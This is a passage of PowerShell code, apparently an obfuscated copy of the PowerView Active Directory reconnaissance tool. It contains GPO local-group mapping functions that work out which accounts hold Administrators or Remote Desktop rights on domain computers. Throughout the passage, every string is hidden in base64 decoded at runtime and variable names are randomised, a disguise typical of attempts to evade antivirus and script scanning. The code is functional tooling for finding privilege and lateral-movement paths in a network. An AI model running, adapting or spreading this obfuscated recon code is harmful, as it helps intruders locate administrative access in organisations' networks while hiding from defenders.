('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        ${35e8eac5180d4e5f9271484d163d6c26} = @()
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) {
       
     ${35e8eac5180d4e5f9271484d163d6c26} += Get-DomainObject 
@9b01c2de50194ad7be1c5b6ceb9278d7 -Identity $Identity | Select-
Object -Expand objectsid
            
${c81b0627fa7a4a438bbefa1cb1ad61c0} = 
${35e8eac5180d4e5f9271484d163d6c26}
            if (-not 
${35e8eac5180d4e5f9271484d163d6c26}) {
                Throw 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcg
BvAHUAcABNAGEAcABwAGkAbgBnAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AH
IAaQBlAHYAZQAgAFMASQBEACAAZgBvAHIAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQ
BkAGUAbgB0AGkAdAB5ACcA')))
            }
        }
        else {
       
     ${35e8eac5180d4e5f9271484d163d6c26} = @('*')
        }
        if 
($LocalGroup -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
            
${1ce1c71338b44b728c66ee63bd99a565} = $LocalGroup
        }
        
elseif ($LocalGroup -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QQBkAG0AaQBuAA==')))) {
            
${1ce1c71338b44b728c66ee63bd99a565} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
        }
        else {
        
    ${1ce1c71338b44b728c66ee63bd99a565} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
        }
        if 
(${35e8eac5180d4e5f9271484d163d6c26}[0] -ne '*') {
            
ForEach (${e12fad257af9417d951d1e88fc2951fd} in 
${35e8eac5180d4e5f9271484d163d6c26}) {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcg
BvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIABuAG
UAcwB0AGUAZAAgAGcAcgBvAHUAcAAgAG0AZQBtAGIAZQByAHMAaABpAHAAcwAgAGYAbw
ByADoAIAAnACQAewBlADEAMgBmAGEAZAAyADUANwBhAGYAOQA0ADEANwBkADkANQAxAG
QAMQBlADgAOABmAGMAMgA5ADUAMQBmAGQAfQAnAA==')))
                
${35e8eac5180d4e5f9271484d163d6c26} += Get-DomainGroup 
@9b01c2de50194ad7be1c5b6ceb9278d7 -Properties 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAcwBpAGQA'))) -MemberIdentity 
${e12fad257af9417d951d1e88fc2951fd} | Select-Object -ExpandProperty 
objectsid
            }
        }
        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcg
BvAHUAcABNAGEAcABwAGkAbgBnAF0AIABUAGEAcgBnAGUAdAAgAGwAbwBjAGEAbABnAH
IAbwB1AHAAIABTAEkARAA6ACAAJAB7ADEAYwBlADEAYwA3ADEAMwAzADgAYgA0ADQAYg
A3ADIAOABjADYANgBlAGUANgAzAGIAZAA5ADkAYQA1ADYANQB9AA==')))
        
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAFUAcwBlAHIATABvAGMAYQBsAEcAcg
BvAHUAcABNAGEAcABwAGkAbgBnAF0AIABFAGYAZgBlAGMAdABpAHYAZQAgAHQAYQByAG
cAZQB0ACAAZABvAG0AYQBpAG4AIABTAEkARABzADoAIAAkAHsAMwA1AGUAOABlAGEAYw
A1ADEAOAAwAGQANABlADUAZgA5ADIANwAxADQAOAA0AGQAMQA2ADMAZAA2AGMAMgA2AH
0A')))
        ${917b0c3026e144f592f1c3b2adcb9498} = Get-
DomainGPOLocalGroup @9b01c2de50194ad7be1c5b6ceb9278d7 -
ResolveMembersToSIDs | ForEach-Object {
            
${99e435de2e8c4448bb98cb268b197bc1} = $_
            if 
(${99e435de2e8c4448bb98cb268b197bc1}.GroupSID -match 
${1ce1c71338b44b728c66ee63bd99a565}) {
                
${99e435de2e8c4448bb98cb268b197bc1}.GroupMembers | Where-Object {$_} 
| ForEach-Object {
                    if ( 
(${35e8eac5180d4e5f9271484d163d6c26}[0] -eq '*') -or 
(${35e8eac5180d4e5f9271484d163d6c26} -Contains $_) ) {
               
         ${99e435de2e8c4448bb98cb268b197bc1}
                    }
    
            }
            }
            if ( 
(${99e435de2e8c4448bb98cb268b197bc1}.GroupMemberOf -contains 
${1ce1c71338b44b728c66ee63bd99a565}) ) {
                if ( 
(${35e8eac5180d4e5f9271484d163d6c26}[0] -eq '*') -or 
(${35e8eac5180d4e5f9271484d163d6c26} -Contains 
${99e435de2e8c4448bb98cb268b197bc1}.GroupSID) ) {
                    
${99e435de2e8c4448bb98cb268b197bc1}
                }
            }
    
    } | Sort-Object -Property GPOName -Unique
        
${917b0c3026e144f592f1c3b2adcb9498} | Where-Object {$_} | ForEach-
Object {
            $GPOname = $_.GPODisplayName
            
${eb1584bdbb2f49ea802541ea2f0227ea} = $_.GPOName
            
${767ea09e55fa4a36b058019153b83208} = $_.GPOPath
            
${c84193de4a8b44db8fb934d6b020b0cf} = $_.GPOType
            if 
($_.GroupMembers) {
                
${2c170ca930694361981c515885e2954d} = $_.GroupMembers
            }
   
         else {
                ${2c170ca930694361981c515885e2954d} = 
$_.GroupSID
            }
            
${d56b878e1dc94c2f8fb5072252fed9bd} = $_.Filters
            if 
(${35e8eac5180d4e5f9271484d163d6c26}[0] -eq '*') {
                
${dbf326d9204d450e83ac1059714ae06a} = 
${2c170ca930694361981c515885e2954d}
            }
            else {
   
             ${dbf326d9204d450e83ac1059714ae06a} = 
${c81b0627fa7a4a438bbefa1cb1ad61c0}
            }
            Get-
DomainOU @9b01c2de50194ad7be1c5b6ceb9278d7 -Raw -Properties 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bgBhAG0AZQAsAGQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQAbgBhAG0AZQA='))) 
-GPLink ${eb1584bdbb2f49ea802541ea2f0227ea} | ForEach-Object {
       
         if (${d56b878e1dc94c2f8fb5072252fed9bd}) {
                  
  ${978ad385d8944d8ea08ef9fd1ab5c488} = Get-DomainComputer 
@9b01c2de50194ad7be1c5b6ceb9278d7 -Properties 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZA
BuAGEAbQBlAA=='))) -SearchBase $_.Path | Where-Object 
{$_.distinguishedname -match 
(${d56b878e1dc94c2f8fb5072252fed9bd}.Value)} | Select-Object -
ExpandProperty dnshostname
                }
                else {
    
                ${978ad385d8944d8ea08ef9fd1ab5c488} = Get-
DomainComputer @9b01c2de50194ad7be1c5b6ceb9278d7 -Properties 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))) -SearchBase $_.Path | 
Select-Object -ExpandProperty dnshostname
                }
           
     if (${978ad385d8944d8ea08ef9fd1ab5c488}) {
                    
if (${978ad385d8944d8ea08ef9fd1ab5c488} -isnot [System.Array]) 
{${978ad385d8944d8ea08ef9fd1ab5c488} = @
(${978ad385d8944d8ea08ef9fd1ab5c488})}
                    ForEach 
(${e12fad257af9417d951d1e88fc2951fd} in 
${dbf326d9204d450e83ac1059714ae06a}) {
                        
$Object = Get-DomainObject @9b01c2de50194ad7be1c5b6ceb9278d7 -
Identity ${e12fad257af9417d951d1e88fc2951fd} -Properties 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdA
BuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAG
oAZQBjAHQAcwBpAGQA')))
                        
${0c2afad63ade46fd8530706fe09c250b} = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -
contains $Object.samaccounttype
                        
${d4718bfca1334af2a0b1a801c37182f6} = New-Object PSObject
            
            ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) 
$Object.samaccountname
                        
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
             
           ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) 
$Object.objectsid
                        
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A'))) $Domain
                        
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEcAcgBvAHUAcAA='))) ${0c2afad63ade46fd8530706fe09c250b}
       
                 ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
              
          ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwBQAE8ARwB1AGkAZAA='))) 
${eb1584bdbb2f49ea802541ea2f0227ea}
                        
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8AUABhAHQAaAA='))) ${767ea09e55fa4a36b058019153b83208}
       
                 ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) 
${c84193de4a8b44db8fb934d6b020b0cf}
                        
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) 
$_.Properties.distinguishedname
                        
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${978ad385d8944d8ea08ef9fd1ab5c488}
                        
${d4718bfca1334af2a0b1a801c37182f6}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQ
BwAHAAaQBuAGcA'))))
                        
${d4718bfca1334af2a0b1a801c37182f6}
                    }
             
   }
            }
            Get-DomainSite 
@9b01c2de50194ad7be1c5b6ceb9278d7 -Properties 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBpAHQAZQBvAGIAagBlAGMAdABiAGwALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQ
BkAG4AYQBtAGUA'))) -GPLink ${eb1584bdbb2f49ea802541ea2f0227ea} | 
ForEach-Object {
                ForEach 
(${e12fad257af9417d951d1e88fc2951fd} in 
${dbf326d9204d450e83ac1059714ae06a}) {
                    $Object = 
Get-DomainObject @9b01c2de50194ad7be1c5b6ceb9278d7 -Identity 
${e12fad257af9417d951d1e88fc2951fd} -Properties 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlACwAcwBhAG0AYQBjAGMAbwB1AG4AdA
BuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAG
oAZQBjAHQAcwBpAGQA')))
                    
${0c2afad63ade46fd8530706fe09c250b} = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -
contains $Object.samaccounttype
                    
${d4718bfca1334af2a0b1a801c37182f6} = New-Object PSObject
            
        ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) 
$Object.samaccountname
                    
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
             
       ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAUwBJAEQA'))) $Object.objectsid
                    
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBzAEcAcgBvAHUAcAA='))) ${0c2afad63ade46fd8530706fe09c250b}
       
             ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A'))) $Domain
           
         ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPOname
              
      ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8ARwB1AGkAZAA='))) ${eb1584bdbb2f49ea802541ea2f0227ea}
       
             ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) 
${767ea09e55fa4a36b058019153b83208}
                    
${d4718bfca1334af2a0b1a801c37182f6} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8AVAB5AHAAZQA='))) ${c84193de4a8b44db8fb934d6b020b0cf}
       
             ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
      
              ${d4718bfca1334af2a0b1a801c37182f6} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
$_.siteobjectbl
                    
${d4718bfca1334af2a0b1a801c37182f6}.PSObject.TypeNames.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBMAG8AYwBhAGwARwByAG8AdQBwAE0AYQ
BwAHAAaQBuAGcA'))))
                    
${d4718bfca1334af2a0b1a801c37182f6}
                }
            }
    
    }
    }
}
function Get-DomainGPOComputerLocalGroupMapping {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding
(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        
[Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', 
Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 
'Name')]
        [String]
        $ComputerIdentity,
        
[Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
      
  [Alias('OU')]
        [String]
        $OUIdentity,
        [String]
  
      [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote 
Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 
'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
  
      $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias
('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${9b01c2de50194ad7be1c5b6ceb9278d7} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS 
{
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQA=')))]) {
            
${3b1c459e33874d4f8bbbaecd1707fc1e} = Get-DomainComputer 
@9b01c2de50194ad7be1c5b6ceb9278d7 -Identity $ComputerIdentity -
Properties $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAZABuAHMAaABvAHMAdA
BuAGEAbQBlAA==')))
            if (-not 
${3b1c459e33874d4f8bbbaecd1707fc1e}) {
                throw 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAEMAbwBtAHAAdQB0AGUAcgBMAG8AYw
BhAGwARwByAG8AdQBwAE0AYQBwAHAAaQBuAGcAXQAgAEMAbwBtAHAAdQB0AGUAcgAgAC
QAQwBvAG0AcAB1AHQAZQByAEkAZABlAG4AdABpAHQAeQAgAG4AbwB0ACAAZgBvAHUAbg
BkAC4AIABUAHIAeQAgAGEAIABmAHUAbABsAHkAIABxAHUAYQBsAGkAZgBpAGUAZAAgAG
gAbwBzAHQAIABuAGEAbQBlAC4A')))
            }
            ForEach 
(${9c0baec859734fc983ee3c04b4cde8a7} in 
${3b1c459e33874d4f8bbbaecd1707fc1e}) {
                
${4889dff954b645d79683f72ca473ec20} = @()
                
${7ad98b42cd2445ecb64347a50a5e7833} = 
${9c0baec859734fc983ee3c04b4cde8a7}.distinguishedname
                
${89e3ce14495f42f99cb463c98f2aa855} = 
${7ad98b42cd2445ecb64347a50a5e7833}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBVAD0A'))))
                if 
(${89e3ce14495f42f99cb463c98f2aa855} -gt 0) {
                    
${bae92f147bed4c71ba56b9f450d91380} = 
${7ad98b42cd2445ecb64347a50a5e7833}.SubString
(${89e3ce14495f42f99cb463c98f2aa855})
                }
               
 if (${bae92f147bed4c71ba56b9f450d91380}) {
                    
${4889dff954b645d79683f72ca473ec20} += Get-DomainOU 
@9b01c2de50194ad7be1c5b6ceb9278d7 -SearchBase 
${bae92f147bed4c71ba56b9f450d91380} -LDAPFilter 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                
        Select-String -InputObject $_.gplink -Pattern 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQ
BbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAE
YAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQ
A5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -
AllMatches | ForEach-Object {$_.Matches | Select-Object -
ExpandProperty Value }
                    }
                }
         
       Write-Verbose "Enumerating the sitename for: 
$(${9c0baec859734fc983ee3c04b4cde8a7}.dnshostname)"
                
${c57ce429cada4aedb1e5c54e27150c97} = (Get-NetComputerSiteName -
ComputerName 
${9c0baec859734fc983ee3c04b4cde8a7}.dnshostname).SiteName
            
    if (${c57ce429cada4aedb1e5c54e27150c97} -and 
(${c57ce429cada4aedb1e5c54e27150c97} -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQByAHIAbwByAA=='))))) {
                    
${4889dff954b645d79683f72ca473ec20} += Get-DomainSite 
@9b01c2de50194ad7be1c5b6ceb9278d7 -Identity 
${c57ce429cada4aedb1e5c54e27150c97} -LDAPFilter 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABnAHAAbABpAG4AawA9ACoAKQA='))) | ForEach-Object {
                
        Select-String -InputObject $_.gplink -Pattern 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABcAHsAKQB7ADAALAAxAH0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsAOAB9AFwALQ
BbADAALQA5AGEALQBmAEEALQBGAF0AewA0AH0AXAAtAFsAMAAtADkAYQAtAGYAQQAtAE
YAXQB7ADQAfQBcAC0AWwAwAC0AOQBhAC0AZgBBAC0ARgBdAHsANAB9AFwALQBbADAALQ
A5AGEALQBmAEEALQBGAF0AewAxADIAfQAoAFwAfQApAHsAMAAsADEAfQA='))) -
AllMatches | ForEach-Object {$_.Matches | Select-Object -
ExpandProperty Value }
                    }
                }
         
       ${4889dff954b645d79683f72ca473ec20} | Get-DomainGPOLocalGroup 
@9b01c2de50194ad7be1c5b6ceb9278d7 | Sort-Object -Property GPOName -
Unique | ForEach-Object {
                    
${99e435de2e8c4448bb98cb268b197bc1} = $_
                    if
(${99e435de2e8c4448bb98cb268b197bc1}.GroupMembers) {
                 
       ${2c170ca930694361981c515885e2954d} = 
${99e435de2e8c4448bb98cb268b197bc1}.GroupMembers
                    
}
                    else {
                        
${2c170ca930694361981c515885e2954d} = 
${99e435de2e8c4448bb98cb268b197bc1}.GroupSID
                    }
    
                ${2c170ca930694361981c515885e2954d} | ForEach-Object 
{
                        $Object = Get-DomainObject 
@9b01c2de50194ad7be1c5b6ceb9278d7 -Identity $_
                       
 ${0c2afad63ade46fd8530706fe09c250b} = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MgA2ADgANAAzADUANAA1ADYA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MgA2ADgANAAzADUANAA1ADcA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('NQAzADYAOAA3ADAAOQAxADIA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('NQAzADYAOAA3ADAAOQAxADMA')))) -
contains $Object.samaccounttype
                        
${90d2ec3ce39f46d7a448d654e26a3acb} = New-Object PSObject
            
            ${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}.dnshostname
                      
  ${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.samaccountname
            
            ${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) 
$Object.distinguishedname
                        
${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                        
${90d2ec3ce39f46d7a448d654e26a3acb} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
